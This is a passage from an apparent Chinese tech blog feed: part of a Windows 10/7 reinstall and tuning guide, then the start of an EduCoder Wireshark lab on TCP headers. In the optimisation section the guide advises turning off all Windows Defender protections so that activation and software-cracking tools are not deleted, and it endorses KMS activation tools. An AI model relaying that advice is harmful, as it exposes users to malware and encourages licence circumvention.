6o1w</p></li><li><p>Win10激活的时候，有时候工具会提示“<strong>Windows处于通知模式</strong>”，具体原因谨一也没细研究过，不过百度可以找到解决办法，嫌麻烦的同学可以到某宝&#x2F;某多多直接购买激活密钥，多看评论区的图片还有机会白嫖。</p></li><li><p>检验激活状态<br>此方法适用于Win10和Win7</p><ul><li><p>按下Win键+R，打开运行（打开运行的方法很多随便你用哪个）</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331180206.png"></p></li><li><p>输入引号里的代码，注意vbs和-之间有一个空格：<strong>“slmgr.vbs -xpr”</strong></p></li><li><p>Win10使用了数字权利工具、使用了购买的密钥、Win7使用了购买的密钥，会提示<strong>“计算机已永久激活“</strong><br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331180213.png"></p></li><li><p>Win10或Win7使用了KMS激活工具，会提示“批量激活将于XXX过期”，不过会有自动续激活，也就是只要一直联网就可以一直激活状态。<strong>在用第三方工具关闭启动项的时候注意不要关闭和KMS有关的计划任务。</strong></p></li></ul></li></ol><hr><h3 id="六、驱动安装"><a href="#六、驱动安装" class="headerlink" title="六、驱动安装"></a>六、驱动安装</h3><h4 id="1-Win10"><a href="#1-Win10" class="headerlink" title="1. Win10"></a>1. Win10</h4><ul><li><p>进入系统之后一般只安装显卡驱动就好了，其他驱动可以等联网状态自己安装，也可以用品牌方的工具安装，不建议使用第三方工具安装。</p></li><li><p><strong>N卡用户请看</strong>：如果因为网速过快，Win10已经安装完了独显DCH驱动，这时候你每次开机都会在右下角弹窗“<strong>NVDIA Control Panel is not found</strong>”</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171302.png"></p><p> <strong>解决办法有三：</strong></p><ul><li>打开Win10应用商店，登陆微软账户，搜索“<strong>NVDIA Control Panel</strong>”安装即可解决。</li><li>先断开网络，在控制面板-卸载程序 或者 设置-应用 里，选中NVDIA相关的软件全部卸载。重启之后安装<strong>第三步第3条</strong>里下载的标准版显卡驱动，就解决了，之后可以联网。</li><li>在系统装完，<strong>开始配置系统还未进入桌面时</strong>，拔出网线不要连Wi-Fi，Win10就不会装驱动，装完标准版驱动再联网安装其他驱动。</li></ul></li></ul><h4 id="2-Win7"><a href="#2-Win7" class="headerlink" title="2. Win7"></a>2. Win7</h4><p>Win7不会自动安装驱动，但也意味着不会自动安装网卡驱动，就是不能上网，所以一定要提前将<strong>第三步第3条</strong>里下载的显卡驱动和万能网卡版驱动大师放到U盘里。</p><h2 id="【教程二】系统初步优化"><a href="#【教程二】系统初步优化" class="headerlink" title="【教程二】系统初步优化"></a>【教程二】系统初步优化</h2><p><strong>很多人喜欢Ghost系统的原因之一是Ghost系统做了所谓的优化，但事实上并不一定，Ghost作者并不知道你的具体配置，他甚至无法知道你用的是N卡还是A卡，又何来优化一说。</strong></p><p>系统优化这件事其实核心就一个：符合自己的需求，因此下面的教程基本都是必做项，不完整但是挺有用。<strong>如果你是大佬，请直接忽略本教程二，如果你对电脑不熟悉，可以跟着做一做。</strong></p><h3 id="一、暂时关闭Defender"><a href="#一、暂时关闭Defender" class="headerlink" title="一、暂时关闭Defender"></a>一、暂时关闭Defender</h3><p>Windows Defender是Win10自带的杀毒软件，<strong>比起各种免费的杀毒软件，在保护电脑安全上它靠谱的多</strong>，毕竟是微软自家的系统，自家的杀毒软件。这一点大家可以自行百度。我们关闭DF的原因很简单：<strong>它会删除我们的系统激活工具，软件破解工具等等</strong>，对于一个天朝人来说它并不是那么的友好。</p><ul><li>如果你不需要用到各种破解软件，完全可以再激活系统后重新打开它，不需要再安装其他免费的杀毒软件。Defender完全够用！如果不够用说明你看片太多了，节制一点。</li><li>如果你接受不了误删你的文件，或者经常接触危险文件。可以关闭之后使用火绒、小红伞Avira、Avast、卡巴斯基免费版等等。</li><li><strong>对病毒最好的防范不是安装好的杀毒软件，而是不下载危险文件。</strong></li></ul><h4 id="关闭方法："><a href="#关闭方法：" class="headerlink" title="关闭方法："></a>关闭方法：</h4><ol><li><p>打开设置-更新和安全-Windows安全中心-病毒和威胁防护</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171134.png"></p></li><li><p>点击病毒和威胁防护设置下方的“管理设置”</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171139.png"></p></li><li><p>将所有的开关都关闭，Defender就不会再误删你的文件。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171143.png"></p></li></ol><h3 id="二、找出桌面图标"><a href="#二、找出桌面图标" class="headerlink" title="二、找出桌面图标"></a>二、找出桌面图标</h3><p>这简直是最简单的一步，但却是很多人都困扰的一步，因为重装完成之后自己的桌面上就一个回收站？？？</p><ol><li><p>右击桌面-个性化</p></li><li><p>选择主题-桌面图标设置：<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171147.png"></p></li><li><p>勾选你需要的图标，应用之后桌面上就会出现了</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171152.png"></p></li></ol><h3 id="三、释放电脑性能"><a href="#三、释放电脑性能" class="headerlink" title="三、释放电脑性能"></a>三、释放电脑性能</h3><p>请务必在跑分之后删除鲁大师之类的软件，你花了钱买回来的电脑不是要节能模式省电的，<strong>而是要在不损伤硬件的前提下享受它的性能的</strong>。</p><p>如果你实在想用鲁大师检测运行游戏时电脑的状态，温度帧数等等，GamePP（游戏加加）是个好选择</p><h4 id="1-CPU内存超频（笔记本电脑请忽略）"><a href="#1-CPU内存超频（笔记本电脑请忽略）" class="headerlink" title="1. CPU内存超频（笔记本电脑请忽略）"></a>1. CPU内存超频（笔记本电脑请忽略）</h4><p>这一部分我不会详细教，因为每个主板的设置方法都不一样，大家自己搜索“品牌+CPU超频设置”、“品牌+内存超频设置”慢慢学习。</p><p>这里我只提供一下思路：</p><ul><li>先查一下你的CPU型号大家都能超频到多少稳定，适当降0.1-0.2，比如大家都能超到4.9Ghz稳定，那你超到4.8、4.7就没啥问题。</li><li>现在的CPU超频大多数是只改倍频，外频默认100Mhz不动，比如倍频48就是CPU4.8Ghz。</li><li>大部分内存都可以升一个档次或两个档次，体质好的可以升三个档次，比如现在DDR4的内存频率一般都是2133、2400、2666、3000、3200等等，颗粒越好能超的越多。</li><li>如果你买的内存频率是高于2666的，插到电脑上也只是默认2666，需要你选择X.M.P配置文件或者自己超到高频率，否则只会以2666频率运行。</li></ul><p><strong>非常不建议笔记本进行超频，即便你的CPU可以超。因为笔记本性能的瓶颈是散热问题，超频可能会导致温度压不住，造成不可挽回的损失。</strong></p><h4 id="2-关闭主板节能模式"><a href="#2-关闭主板节能模式" class="headerlink" title="2. 关闭主板节能模式"></a>2. 关闭主板节能模式</h4><p>笔记本电脑一般没有这个选项。</p><p>各个主板的设置方法不一样，AMD平台一般都有，Intel平台较少，大家自己查找即可。</p><p>如果你进行了超频，记得进行“<strong>防掉压设置</strong>”。</p><h4 id="3-打开系统高性能模式"><a href="#3-打开系统高性能模式" class="headerlink" title="3. 打开系统高性能模式"></a>3. 打开系统高性能模式</h4><ul><li><p>打开控制面板，在右上角将查看方式改为小图标</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171155.png"></p></li><li><p>找到电源选项</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171159.png"></p></li><li><p>点击右边的下拉箭头打开隐藏附加计划，选择“高性能“，<strong>如果这里没有高性能选项也可以到左边”创建电源计划“自己创建一个</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171205.png"></p></li><li><p>如果你是N卡：右击桌面-NVDIA控制面板-将“<strong>设置PhysX配置</strong>”选择为你的独立显卡，然后右下角点击应用；<strong>如果你是N卡笔记本，还需要在“管理3D设置”里将首选图形处理器选为“高性能NVDIA处理器”</strong>，然后右下角点击应用。</p></li></ul><h3 id="四、关闭启动项"><a href="#四、关闭启动项" class="headerlink" title="四、关闭启动项"></a>四、关闭启动项</h3><p><strong>你可以先安装你要用的软件，安装差不多了再来关闭启动项。</strong></p><p>关闭你不需要的启动项不仅可以防止一开机就弹出一大堆应用，还能加速开机时间，减少电脑开机时候的卡顿情况。</p><p>打开控制面板，到“启动”这一页里就可以关闭你不需要的启动项，你也可以用第三方软件来管理启动项：<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171209.png"></p><h3 id="五、关闭弹窗"><a href="#五、关闭弹窗" class="headerlink" title="五、关闭弹窗"></a>五、关闭弹窗</h3><p>目前针对弹窗没有什么特别好的完全清理方法，只能做到拦截。</p><ul><li><p>如果是在屏幕正中出现的广告弹窗，一般弹窗里会有设置按钮或者三道杠按钮，点开里面会有“不再弹出”“永久关闭”等选项。</p></li><li><p>如果是在右下角出现的广告弹窗，一般会有“不再提示”可以勾选，勾选后关闭就不会再弹出。</p></li><li><p>爱奇艺优酷等等的广告，在软件设置里可以关闭弹窗。</p></li><li><p>火绒等安全软件会有弹窗拦截小工具，用起来效果还算不错。</p></li></ul><h2 id="【教程三】系统备份与还原"><a href="#【教程三】系统备份与还原" class="headerlink" title="【教程三】系统备份与还原"></a>【教程三】系统备份与还原</h2><p><strong>每一次重装都很麻烦，要设置很多东西，最好的方法就是在重装完毕，优化完毕之后，直接进行一次备份，如果以后有什么问题，直接还原就可以了。</strong></p><h3 id="一、备份"><a href="#一、备份" class="headerlink" title="一、备份"></a>一、备份</h3><p>我们这里不使用Windows自带的备份还原，因为有更加方便快捷省事的方式</p><ol><li><p>下载软件Dism++：<a target="_blank" rel="noopener" href="https://www.chuyu.me/zh-Hans/index.html">www.chuyu.me/zh-Hans/index.html</a></p></li><li><p>解压运行，64位系统运行“Dism++x64”，32位系统运行“Dism++x86”</p></li><li><p>打开软件后选择工具箱-系统备份</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171214.png"></p></li><li><p>点击“浏览”，选择生成的备份文件的存放路径（确保这个路径的空间要比你现在C盘的已使用空间要大），然后在文件名一栏里给备份文件起一个名字，建议以时间为命名方式</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331173803.png"></p></li><li><p>点击保存、确定之后就会开始备份，可以看到进度条。备份速度是先慢后快的，C盘越大越慢。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171218.png"></p></li><li><p>备份完成会生成一个.wim格式的文件，你可以把此文件放到C盘以外的其他盘或者移动硬盘安全保存。</p></li></ol><h3 id="二、还原"><a href="#二、还原" class="headerlink" title="二、还原"></a>二、还原</h3><p>上面生成的wim文件既可以给你的电脑还原，也可以给其他电脑（但是不建议，除非配置一样）</p><ol><li><p>插入微PE U盘，从U盘启动电脑。</p></li><li><p>打开CGI备份还原，选择你的系统盘，镜像文件选择你的wim格式的备份文件，整个步骤和重装系统是一样的，具体请查看【教程一】第四步。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171221.jpg"></p></li><li><p>还原完成重启进入电脑，你会发现C盘被恢复到了备份时候的样子，文件布局、各种设置都一模一样。</p></li></ol><h2 id="【教程四】无法引导系统解决办法"><a href="#【教程四】无法引导系统解决办法" class="headerlink" title="【教程四】无法引导系统解决办法"></a>【教程四】无法引导系统解决办法</h2><p>如果调整或删除了系统盘的隐藏分区，比如很多人为了干净，会选择删除所有分区，或者使用了新的没有安装过系统的硬盘，可能会遇到重启之后无法进去系统的情况。</p><p>这时候有两个方法来解决：</p><h3 id="一、自助建立ESP和MSR分区"><a href="#一、自助建立ESP和MSR分区" class="headerlink" title="一、自助建立ESP和MSR分区"></a>一、自助建立ESP和MSR分区</h3><ol><li><p>在PE盘里打开分区助手，找到系统盘对应的那块硬盘，先删除所有分区，会变为一块未分配的空间，然后再建立一个新分区，点左上角提交（<strong>分区助手里必须提交才能生效</strong>）</p></li><li><p>点击分区助手上方的“快速分区”，根据自己的需要选择分区数量和各个区的大小，不想分区就在分区数目里选择“1”</p></li><li><p><strong>在“磁盘的类型”里选择“GPT”，勾选“创建ESP和MSR分区”，选择分区对齐到“4096扇区”</strong>，然后开始执行分区，一般来说分区完成之后就可以正常安装系统，<strong>如果还是不行，请尝试方法二</strong><br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171225.jpg"></p></li></ol><h3 id="二、使用传统Windows安装方法自动建立"><a href="#二、使用传统Windows安装方法自动建立" class="headerlink" title="二、使用传统Windows安装方法自动建立"></a>二、使用传统Windows安装方法自动建立</h3><p><strong>如果你使用了【教程一】前言里系统重装方法二，请直接从第3步开始看</strong></p><ol><li><p>在PE盘里找到你的系统镜像文件，右击“加载ImDisk虚拟光驱”，加载设置直接默认就行，然后PE系统的此电脑里就会多出一个CD驱动器。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171230.jpg"></p></li><li><p>打开CD驱动器，运行“setup.exe”，就可以开始传统的Windows安装方式：<br> <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171234.jpg"></p></li><li><p>这一步点击下方的<strong>“我没有产品密钥”</strong>就可以跳过，我们可以在系统安装完成之后再用工具激活。<br> <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171238.jpg"></p></li><li><p>这一步请务必选择<strong>“自定义：仅安装Windows”</strong>，图片里的框请忽视：<br> <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171242.jpg"></p></li><li><p>这一步请先将所有的磁盘都删除，操作方法：挨个选中磁盘，点击“<strong>删除</strong>”，直到磁盘变成一块未分配的空间，然后点击“<strong>新建</strong>”，默认大小即可，系统会提示“<strong>若确保Windos所有功能都正常，Windows可能要为系统文件创建额外的分区</strong>”，即创建ESP和MSR分区，确定即可</p><p> <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171247.jpg"></p></li><li><p>然后选择要安装系统的盘，就可以正常安装了，安装完成重启会进入新系统。</p></li></ol><h2 id="【教程五】Win10万能恢复"><a href="#【教程五】Win10万能恢复" class="headerlink" title="【教程五】Win10万能恢复"></a>【教程五】Win10万能恢复</h2><p>除去前面讲的正常装机外，还有一种装机方法，可以忽略硬盘格式，BIOS设置等等，简单快速的让电脑恢复到一个全新的Win10系统，并且不需要U盘作为PE系统辅助装机。</p><p>代价：</p><ul><li>系统盘中的软件重置，所有装在C盘的应用软件丢失，其他分区(如D盘、E盘等非系统盘)暂无影响。</li><li>只支持Windows10系统, 且并非所有品牌机型适用(因为遇到过有厂商直接取消了这一方法)。</li></ul><p><strong>使用此方法不需要任何的设置，你只需按照一下步骤就能重置系统</strong>，只要你的电脑硬件没问题。</p><h3 id="方法1-通过Windows设定中的重置选项执行重新安装Windows"><a href="#方法1-通过Windows设定中的重置选项执行重新安装Windows" class="headerlink" title="方法1: 通过Windows设定中的重置选项执行重新安装Windows"></a>方法1: 通过Windows设定中的重置选项执行重新安装Windows</h3><h4 id="Windows-11-操作系统"><a href="#Windows-11-操作系统" class="headerlink" title="Windows 11 操作系统"></a>Windows 11 操作系统</h4><ol><li>在Windows搜寻栏输入<code>[重置此电脑]</code>①，然后点选<code>[打开]</code>②。</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220418120745179.png" alt="image-20220418120745179"><br>2. 在重置此电脑选项中，点击<code>[初始化电脑]</code>③。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/2671e366-8991-4180-81ed-b8af7a379764.jpg" alt="img"><br>3. 点选<code>[保留我的文件]</code>④<br>   <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/9457f1fa-1d95-4a69-bc97-22a5d76831c3.jpg" alt="img"></p><ol start="4"><li>点选<code>[本机重新安装]</code>⑤。</li></ol><blockquote><p>注: 如果无法通过本机重新安装Windows或是出现任何错误，您可以选择云端下载以重新安装Windows。(若选择云端下载，须将您的电脑置于可用的internet网络连接区域)</p></blockquote><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/290d6633-e6c5-483d-8ef5-272b49b45746-20220418121209646.jpg" alt="img"></p><ol start="5"><li>点选<code>[更改设置]</code>⑥。</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/f9995594-cf33-4c26-a711-87c28a97e178.jpg" alt="img"></p><ol start="6"><li>将[还原预安装的应用]设定为开启⑦，然后点选<code>[确认]</code>⑧。<blockquote><p>请注意: 如果您的电脑购买时已有安装Windows操作系统，当您将[还原预安装的应用]设置为关闭时，将会删除出厂所预安装的所有ASUS应用程序与设置。</p></blockquote></li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/da8ceca4-6936-4fb2-9d1a-717c8f3bda98.jpg" alt="img"></p><ol start="7"><li>确认完设置后，请点选<code>[下一步]</code>⑨ 。<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/66e54334-4d88-4880-91ad-c2af91d9c513.jpg" alt="img"></li></ol><p>8.您可能会收到更新讯息，点选<code>[下一步]</code>以继续还原程序。</p><p>9.点击<code>[查看将删除的应用]</code>⑩。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/49ed739e-311d-4a87-8fd1-52a404deae18.jpg" alt="img"></p><p>10.重置电脑时，将会删除您的应用程序。以下将会列出无法通过Microsoft Store重新安装的应用程序列表，您需要从网络或是安装光盘重新安装下列应用程序。请点选<code>[后退]</code>⑪并继续下一个步骤。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/f903568c-0fe7-4d8f-8382-1434def02e4a.jpg" alt="img"></p><p>11.点选<code>[重置]</code>⑫。系统将会开始重新安装Windows 11，安装完成将会重新启动。</p><blockquote><p>注意: 重置过程中请确保电脑有接上电源且不要强制关机，以避免发生异常问题。</p></blockquote><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/59aa86b6-e37b-4590-a557-10179c7e3211.jpg" alt="img"></p><h4 id="Windows10-操作系统"><a href="#Windows10-操作系统" class="headerlink" title="Windows10 操作系统"></a>Windows10 操作系统</h4><ol><li>开始<br>点击<code> &quot;开始&quot;</code> 菜单.</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/4EED1061-E944-481E-8921-C8EACEE31ABB.png" alt="4EED1061-E944-481E-8921-C8EACEE31ABB"></p><ol start="2"><li>点击<code> &quot;设置&quot;</code>.</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/9CBC7CF8-FB28-4431-A1CF-568568E1870C.png" alt="9CBC7CF8-FB28-4431-A1CF-568568E1870C"></p><ol start="3"><li>点击 <code>&quot;更新和安全&quot;</code>.</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/482E5682-49B6-4B20-95C2-278378327C6E.png" alt="482E5682-49B6-4B20-95C2-278378327C6E"></p><p>4. </p><ul><li>点击<code> &quot;恢复&quot;</code>，选择重置此电脑 </li><li>点击 <code>&quot;开始&quot;</code>.</li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/98CE778E-772A-49B4-A7E1-D023637ED7E5.png" alt="98CE778E-772A-49B4-A7E1-D023637ED7E5"></p><ol start="5"><li>选择<code> &quot;保留我的文件&quot;</code>.</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/C4C0914C-4428-4CB8-8D04-2CF88199FBF6.png" alt="C4C0914C-4428-4CB8-8D04-2CF88199FBF6"></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/75F681C1-9560-45E2-B4EA-C720FB0B42F4.png" alt="75F681C1-9560-45E2-B4EA-C720FB0B42F4"></p><ol start="6"><li>点击 <code>&quot;下一步&quot;</code>.</li></ol><p>在此页面您需要确认您已知晓恢复出厂后程序都将被删除</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/1197DFCF-2F3C-42A2-A545-855B5B0CF7A3.png" alt="1197DFCF-2F3C-42A2-A545-855B5B0CF7A3"></p><ol start="7"><li>点击 <code>&quot;重置&quot;</code>.</li></ol><p>这是开始恢复前的最后一步。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/A3609854-571B-45F1-87D3-735F94B2FF3E.png" alt="A3609854-571B-45F1-87D3-735F94B2FF3E"></p><h3 id="方法2-通过Windows修复环境-WinRE-执行重新安装Windows"><a href="#方法2-通过Windows修复环境-WinRE-执行重新安装Windows" class="headerlink" title="方法2: 通过Windows修复环境(WinRE)执行重新安装Windows"></a>方法2: 通过Windows修复环境(WinRE)执行重新安装Windows</h3><ol><li>进入Windows修复环境<br>点击 <code>&quot;开始&quot;</code> 菜单.</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/4EED1061-E944-481E-8921-C8EACEE31ABB.png" alt="4EED1061-E944-481E-8921-C8EACEE31ABB"></p><p>一直按住键盘上的<kbd>Shift</kbd>不要松手, 然后点击电源中的重启按钮, 稍等几秒钟就会进入<code>Windows修复环境</code><br>2. Windows修复环境后，选择<code>[疑难解答]</code>①。<br>   <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/3453566A-61A3-4148-A61F-2BD86AA987EE.png" alt="3453566A-61A3-4148-A61F-2BD86AA987EE"></p><ol start="3"><li>选择<code>[重置此电脑]</code>②</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/E0D4AD1D-B47E-46A8-B626-B49F4DD9F7F4.png" alt="E0D4AD1D-B47E-46A8-B626-B49F4DD9F7F4"></p><ol start="4"><li><p>选择<code>[保留我的文件]</code>③。<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/C9F5D08C-FC9D-4045-93B2-5413C9D41927.png" alt="C9F5D08C-FC9D-4045-93B2-5413C9D41927"></p></li><li><p>选择<code>[本机重新安装]</code>④。</p></li></ol><blockquote><p>注: 如果无法通过本机重新安装Windows或是出现任何错误，您可以选择云端下载以重新安装Windows。(若选择云端下载，须将您的电脑置 于可用的因特网区域)</p></blockquote><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/01B97ADB-D92A-4D15-912E-62F61478052D.png" alt="01B97ADB-D92A-4D15-912E-62F61478052D"></p><ol start="6"><li>点击<code>[重置]</code>⑤，电脑将会开始重新安装Windows。<blockquote><p>注意: 重置过程中请确保电脑有接上电源且不要强制关机，以避免发生异常问题。</p></blockquote></li></ol><p>  <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/3B1134D4-13C2-43BE-8BFB-8CA20F83339E.png" alt="3B1134D4-13C2-43BE-8BFB-8CA20F83339E"></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 重装系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EduCoder 传输层协议分析</title>
      <link href="/2022/04/12/62bcbc27515b-q1jun/"/>
      <url>/2022/04/12/62bcbc27515b-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="EduCoder-传输层协议分析"><a href="#EduCoder-传输层协议分析" class="headerlink" title="EduCoder 传输层协议分析"></a>EduCoder 传输层协议分析</h1><ul><li>关卡1: TCP 包基础<ul><li>了解 TCP 数据包结构及格式，以及其具体的含义。</li></ul></li><li>关卡2: 三次握手<ul><li>分析 TCP 的三次握手的具体过程。</li></ul></li><li>关卡3: 拥塞控制<ul><li>了解拥塞控制，掌握重传机制。</li></ul></li><li>关卡4:  UDP 包分析<ul><li>能够掌握简单的 UDP 包分析。</li></ul></li></ul><h2 id="0x01-TCP-包基础"><a href="#0x01-TCP-包基础" class="headerlink" title="0x01 TCP 包基础"></a>0x01 TCP 包基础</h2><h3 id="0x0101-相关知识"><a href="#0x0101-相关知识" class="headerlink" title="0x0101 相关知识"></a>0x0101 相关知识</h3><p>为了完成本关任务，你需要掌握：  </p><ol><li>理解并掌握 TCP 报文段标记的具体含义；</li><li>在 Wireshark 抓包软件中分析 TCP 报文。</li></ol><p><strong>TCP 首部格式</strong> </p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/554139.png" alt="预览大图"></p><ul><li><p>源端口( 16 位)：通信发送方使用的端口号</p></li><li><p>目标端口( 16 位)：通信接收方使用的端口号</p></li><li><p>序列号( 32 位)：用来确保数据可靠传输的唯一值</p></li><li><p>确认号( 32 位)：接收方在响应时发送的数值</p></li><li><p>数据偏移( 4 位)：标志数据包开始的位置，TCP 头部的长度</p></li><li><p>标记( 12 位&#x2F; 6 位)：<br><code>SYN</code>：(同步)发起连接的数据包：同步 <code>SYN=1</code> 表示这是一个连接请求或连接接受报文。<br><code>ACK</code>：(确认)确认收到的数据包：只有当 <code>ACK=1</code> 时，确认号字段才有效；当 <code>ACK=0</code> 时，确认号无效。<br><code>RST</code>：(重置)之前尝试的连接被关闭，(信号差，信号拥挤)：当 <code>RST=1</code> 时，表明 TCP 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接。<br><code>FIN</code>：(结束)连接成功，传输完毕之后，连接正在断开：用来释放一个连接，<code>FIN=1</code> 表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。<br><code>PSH</code>：(推送)数据包直接发送给应用，而不是缓存起来：接收 TCP 收到 <code>PSH=1</code> 的报文段，就尽快地交付接收应用进程，而不再等到整个缓存都填满了后再向上交付。<br><code>URG</code>：(紧急)数据包中承载的内容应该立即由 TCP 协议栈立即进行处理：当 <code>URG=1</code> 时，表明紧急指针字段有效。它告诉系统此报文段中有紧急数据，应尽快传送(相当于高优先级的数据)。<br><code>CWR</code>：(拥塞窗口减小)缓存区已满或者拥挤，通信双方都应该降低传输的速率。</p></li><li><p>窗口大小( 16 位)：匹配缓存区的大小</p></li><li><p>校验和( 16 位)：确认 TCP 数据段中的内容是否发送了变化</p></li><li><p>紧急指针( 16 位)：明确显示数据之前的 16 进制序列号</p></li></ul><p>其中，<code>ACK </code>是可能与 <code>SYN</code>，<code>FIN</code> 等同时使用的，比如 <code>SYN</code> 和 <code>ACK</code> 可能同时为 1 ，它表示的就是建立连接之后的响应， 如果只是单个的一个 <code>SYN</code> ，它表示的只是建立连接。（ TCP 的几次握手就是通过这样的 <code>ACK</code> 表现出来的）， 但 <code>SYN</code> 与 <code>FIN</code> 是不会同时为 1 的，因为前者表示的是建立连接，而后者表示的是断开连接。<code>RST</code> 一般是在 <code>FIN</code> 之后才会出现为 1 的情况，表示的是连接重置。一般地，当出现 <code>FIN</code> 包或 <code>RST</code> 包时，我们便认为客户端与服务器端断开了连接；而当出现 <code>SYN</code> 和 <code>SYN＋ACK</code> 包时，我们认为客户端与服务器建立了一个连接。</p><h3 id="0x0102-实验流程"><a href="#0x0102-实验流程" class="headerlink" title="0x0102 实验流程"></a>0x0102 实验流程</h3><p><strong>（1）打开 Wireshark ，加载实训文件夹中的<code>tcp-ethereal-trace-1</code>文件，并筛选出其中的”TCP”报文；</strong></p><p>在过滤器中输入<code>tcp</code>, 如下图所示: </p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412122917077.png" alt="image-20220412122917077"></p><p><strong>（2）展开<code>TCP</code>分组，查看本机使用的 IP 地址和 TCP 端口号是什么，填写到文件中；</strong></p><p>本机所使用的IP地址和TCP端口分别如图所示:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412123118492.png" alt="image-20220412123118492"></p><p><strong>（3）<code>gaia.cs.umass.edu</code>（目标网站）的 IP 地址和 TCP 端口号是什么，填写到文件中。</strong></p><p>先使用Terminal终端输入以下命令确认<code>gaia.cs.umass.edu</code>（目标网站）的IP地址:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping gaia.cs.umass.edu</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412123319094.png" alt="image-20220412123319094"></p><p>得到其ip地址为: <strong>128.119.245.12</strong> </p><p>和第一个(时序)TCP包的Dst IP地址一致, 所以<code>gaia.cs.umass.edu</code>（目标网站）的 IP 地址和 TCP 端口号如下所示:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412123508042.png" alt="image-20220412123508042"></p><h3 id="0x0103-最终结果"><a href="#0x0103-最终结果" class="headerlink" title="0x0103 最终结果"></a>0x0103 最终结果</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机使用的IP地址和TCP端口号(用;隔开):192.168.1.102;1161</span><br><span class="line">gaia.cs.umass.edu的IP地址和端口号(用;隔开):128.119.245.12;80</span><br></pre></td></tr></table></figure><h2 id="0x02-三次握手"><a href="#0x02-三次握手" class="headerlink" title="0x02 三次握手"></a>0x02 三次握手</h2><h3 id="0x0201-相关知识"><a href="#0x0201-相关知识" class="headerlink" title="0x0201 相关知识"></a>0x0201 相关知识</h3><p>为了完成本关任务，你需要掌握：  </p><ol><li>了解三次握手协议的内容；</li><li>在 Wireshark 中抓取 TCP 数据包。</li></ol><p><strong>三次握手建立连接</strong></p><p><img 